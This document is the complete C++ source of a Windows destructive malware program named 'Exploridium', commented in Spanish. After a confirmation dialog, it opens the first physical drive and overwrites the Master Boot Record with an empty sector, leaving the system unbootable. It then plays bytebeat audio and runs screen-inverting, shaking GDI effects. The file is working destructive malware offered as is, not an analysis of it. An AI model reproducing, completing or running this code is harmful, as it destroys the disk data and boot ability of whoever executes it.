#include <windows.h>
#include <mmsystem.h>
#include <math.h>

// Librerías necesarias para el enlazador
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")

// Variables globales para control de tiempo y estado
unsigned int t = 0;
bool activo = true;
const int FASE_MUSTRAS = 330750; // 30 segundos exactos a 11025Hz

// Función para sobrescribir el Master Boot Record (Sector 0)
void DestruirMBR() {
    DWORD wb;
    char mbrData[512] = { 0 };
    // Firma de arranque estándar de Windows
    mbrData[510] = (char)0x55;
    mbrData[511] = (char)0xAA;

    // Intento de acceso directo al disco físico
    HANDLE hDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (hDrive != INVALID_HANDLE_VALUE) {
        WriteFile(hDrive, mbrData, 512, &wb, NULL);
        CloseHandle(hDrive);
    }
}

// Motor de Audio Bytebeat (Hilo separado)
DWORD WINAPI AudioEngine(LPVOID lpParam) {
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    char buffer[11025];
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };

    // El hilo corre mientras 'activo' sea true y no pasen las 10 fases
    while (activo && t < (FASE_MUSTRAS * 10)) {
        for (int i = 0; i < sizeof(buffer); i++, t++) {
            if (t < FASE_MUSTRAS) // Fase 01
                buffer[i] = (char)(t >> (((t % 2 ? t % ((t >> 13) % 8 >= 2 ? ((t >> 13) % 8 >= 4 ? 41 : 51) : 61) : t % 34))) | (~t >> 4));
            else if (t < FASE_MUSTRAS * 2) { // Fase 02
                int nse[] = { 48,50,52,53,55,57,59 };
                buffer[i] = (char)((nse[(t / 20) % 7] - 48) * 28 & t / 90 & -t / 91);
            }
            else if (t < FASE_MUSTRAS * 3) // Fase 03
                buffer[i] = (char)(t * (t ^ t + (t >> 15 | 1) ^ (t - 1280 ^ t) >> 10));
            else if (t < FASE_MUSTRAS * 4) // Fase 04
                buffer[i] = (char)(t * (((t >> 9) ^ ((t >> 9) - 1) ^ 1) % 13) * t);
            else if (t < FASE_MUSTRAS * 5) // Fase 05
                buffer[i] = (char)(15 - t % (t & 16384 ? 26 : 29) & t >> 4 | t << 1 & -t >> 4);
            else if (t < FASE_MUSTRAS * 6) // Fase 06
                buffer[i] = (char)(t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t >> 6 : 16) + (1 & t >> 14)) >> (3 & -t >> (t & 2048 ? 2 : 10)));
            else if (t < FASE_MUSTRAS * 7) // Fase 07
                buffer[i] = (char)(((t & 32767) >> 13 == 2 | (t & 65535) >> 12 == 9 ? (t ^ -(t / 8 & t >> 5) * (t / 8 & 127)) & (-(t >> 5) & 255) * ((t & 65535) >> 12 == 9 ? 2 : 1) : (t & 8191) % ((t >> 5 & 255 ^ 240) == 0 ? 1 : t >> 5 & 255 ^ 240)) / 4 * 3 + (t * 4 / (4 + (t >> 15 & 3)) & 128) * (-t >> 11 & 2) * ((t & 32767) >> 13 != 2) / 3);
            else if (t < FASE_MUSTRAS * 8) // Fase 08
                buffer[i] = (char)((((t * (t & 16384 ? 7 : 5) * (3 - (3 & t >> 9) + (3 & t >> (-t >> 20 & 1 ? 8 : 11))) >> (3 & -t >> (t & (-t & 57344 ? 4096 : 6144) ? 2 : 16)) | (-t & 24576 ? (3 * t >> 5) % 192 : (t >> 4) % 192) | (t >> 20 & 1 ? t >> 4 : t >> (-t >> 18 & 1) + 2)) & 255) >> 1));
            else if (t < FASE_MUSTRAS * 9) { // Fase 09
                int a = (int)(30 * t * pow(1.059, (t >> 13) % 12));
                buffer[i] = (char)((a % 255 + a % 128 + a % 64 + a % 32) / 3);
            }
            else // Fase 10
                buffer[i] = (char)((t * (t >> 8 | t >> 9) & 46 & t >> 8) ^ (t & t >> 13 | t >> 6));
        }
        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
        while (!(header.dwFlags & WHDR_DONE) && activo) Sleep(1);
        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    }
    activo = false;
    waveOutClose(hWaveOut);
    return 0;
}

int main() {
    // Cuadro de diálogo de advertencia
    if (MessageBoxA(NULL, "ADVERTENCIA: ¿Deseas ejecutar Exploridium REAL?\nEsto destruirá el Master Boot Record (MBR).", "ALERTA CRÍTICA", MB_YESNO | MB_ICONSTOP) == IDYES) {
        
        DestruirMBR(); // Ejecución del payload destructivo
        ShowWindow(GetConsoleWindow(), SW_HIDE); // Ocultar la consola
        
        // Iniciar el hilo de audio
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AudioEngine, NULL, 0, NULL);
        
        HDC hdc = GetDC(0);
        int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);

        // Bucle de efectos visuales GDI
        while (activo) {
            // Efecto de sacudida e inversión
            BitBlt(hdc, rand() % 10 - 5, rand() % 10 - 5, sw, sh, hdc, 0, 0, SRCINVERT);
            
            // Inversión total cada cierto tiempo
            if (t % 10000 == 0) BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, NOTSRCCOPY);
            
            Sleep(5); // Control de velocidad del GDI
        }

        ReleaseDC(0, hdc);
    }
    return 0;
}